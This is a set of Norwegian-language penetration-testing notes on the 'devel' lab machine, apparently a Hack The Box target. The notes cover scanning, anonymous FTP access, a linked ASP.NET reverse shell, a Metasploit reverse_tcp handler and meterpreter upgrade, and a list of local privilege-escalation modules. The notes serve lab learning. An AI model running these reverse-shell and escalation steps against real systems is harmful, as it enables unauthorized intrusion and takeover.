# devel 10.10.10.5

windows maskin

`oot@kali:~# nmap -sS -P0 10.10.10.5`

`Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-26 09:47 EDT`

`Nmap scan report for 10.10.10.5`

`Host is up (0.061s latency).`

`Not shown: 998 filtered ports`

`PORT   STATE SERVICE`

`21/tcp open  ftp`

`80/tcp open  http`

logget inn **ftp **med **anonymous**.   login med -i som fjerner prompts

http kjører iis7


fikk et skikkelig shell med [https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/](https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/)


**windows 7 6.1 build 7600 x86**

**koble et shell rett inn i metasploit og oppgradere til meterpreter**



```
* use multi/handler

* set LHOST attack-machine

* set LPORT port-as-appropraite

* set payload windows/shell/reverse\_tcp

* exploit'
```


background session med ctrl z&lt;

`use post/multi/manage/shell_to_meterpreter`


kan her kjøre kommandoer. 


```
net users
```


```
Administrator            babis                    Guest**
``

/c whoami = iis apppool\**web**



**```
use post/multi/recon/local_exploit_suggester **
**FORSØKT ALLE DISSE UTEN HELL**



```

\[+\] 10.10.10.5 - exploit/windows/local/bypassuac\_eventvwr: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms10\_015\_kitrap0d: The target service is running, but could not be validated.

\[+\] 10.10.10.5 - exploit/windows/local/ms10\_092\_schelevator: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms13\_053\_schlamperei: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms13\_081\_track\_popup\_menu: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms14\_058\_track\_popup\_menu: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms15\_004\_tswbproxy: The target service is running, but could not be validated.

\[+\] 10.10.10.5 - exploit/windows/local/ms15\_051\_client\_copy\_image: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms16\_016\_webdav: The target service is running, but could not be validated.

\[+\] 10.10.10.5 - exploit/windows/local/ms16\_032\_secondary\_logon\_handle\_privesc: The target service is running, but could not be validated.

\[+\] 10.10.10.5 - exploit/windows/local/ppr\_flatten\_rec: The target appears to be vulnerable.
```

getsystem = ingenting

```

wmic qfe get
```

no work :(

sjekke hvilke prossesser som kjører med admin privelege.



```
use post/windows/gather/enum_patches    
```
msf post(shell_to_meterpreter) > use post/windows/gather/enum_patches
msf post(enum_patches) > set session 2
session => 2
msf post(enum_patches) > exploit

[-] Post failed: NoMethodError undefined method `[]' for nil:NilClass
[-] Call stack:
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/enum_patches.rb:72:in `run'
[*] Post module execution completed

msf post(enum_patches) > run

[-] Known bug in WMI query, try migrating to another process
[*] Post module execution completed




